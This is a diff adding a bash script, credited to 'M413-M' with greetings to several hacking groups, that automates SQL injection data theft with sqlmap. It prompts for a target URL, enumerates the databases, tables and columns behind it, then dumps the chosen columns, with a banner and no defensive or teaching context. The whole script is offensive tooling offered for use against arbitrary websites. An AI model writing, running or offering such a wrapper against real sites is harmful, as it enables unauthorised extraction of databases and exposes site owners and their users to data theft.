@@ -1,0 +1,73 @@
+#!/bin/bash
+#this file was created on 
+#created by M413-M 
+green='\e[1;32m'
+red='\e[1;31m'
+white='\e[1;37m'
+yellow='\e[1;33m'
+blue='\e[0;34m'
+default='\033[00m'
+chmod +x getyou
+sudo apt-get install sqlmap
+clear
+clear
+trap ctrl_c INT
+ctrl_c() {
+clear
+echo -e $white"	OO******************************************OO"
+echo -e $white"	||       Thanks For Using My Tools          ||"
+echo -e $white"	||                 M413-M                   ||"
+echo -e $white"	||==========================================||"
+echo -e $white"	||          email : m413-m@dr.com           ||"
+echo -e $white"	||      github : www.github.com/M413-M/     ||"
+echo -e $white"	||           instagram : mrmalem            ||"
+echo -e $white"	OO******************************************OO"
+
+
+sleep 1
+exit
+}
+#####################################################################
+echo; date
+echo -e $red"================================================================================="
+echo -e $red"\n		 ===============================================
+		 ==      ================  ====  ===============
+	 	 =   ==   ===============   ==   ===============
+ 		 =  ====  ==========  ====  ==  ================
+		 =  =========   ===    ===  ==  ====   ===  =  =
+		 $white=  ========  =  ===  =====    ====     ==  =  =
+		 =  ===   ==     ===  ======  =====  =  ==  =  =
+		 =  ====  ==  ======  ======  =====  =  ==  =  =
+		 =   ==   ==  =  ===  ======  =====  =  ==  =  =
+		 ==      ====   ====   =====  ======   ====    =
+		 ==============================================="
+echo -e $white"		|		Recoded By M413-M		|"
+echo -e $white"		 ==============================================="
+echo -e $white"\n		   Thanks to 4WSec - Mr.Tenwap - ChokyChoky.ID "
+echo -e "   Anak Bawang Cyber$red "X" $white"Security Darknet"$red "X" $white"Moslem Cyber Team" $red"X" $white"Anon Cyber Team\n""
+echo -e $white"=================================================================================\n"
+echo -e $default" Auto Dumping From Sqlmap :D "
+echo -e $default" \n type the url"
+echo -e $default" ex: www.google.com/getyou.php?id=100"
+echo -e $red""
+#Memulai#############
+
+read -p " [X] Target URL >>: " dbs;
+if [[ $dbs ]]; then
+	sqlmap -u $dbs --dbs
+fi
+echo -e $red""
+read -p " [X] Database >>: " tbl;
+if [[ $dbs ]] || [[ $tbl ]]; then
+	sqlmap -u $dbs -D $tbl --tables
+fi
+echo -e $red""
+read -p " [X] Columns >>: " clm;
+if [[ $dbs ]] || [[ $tbl ]] || [[ $clm ]]; then
+	sqlmap -u $dbs -D $tbl -T $clm --columns
+fi
+echo -e $red""
+read -p " [X] Dump :"V" >>: " dump;
+if [[ $dbs ]] || [[ $tbl ]] || [[ $clm ]] || [[ $dump ]]; then
+	sqlmap -u $dbs -D $tbl -T $clm -C $dump --dump
+fi
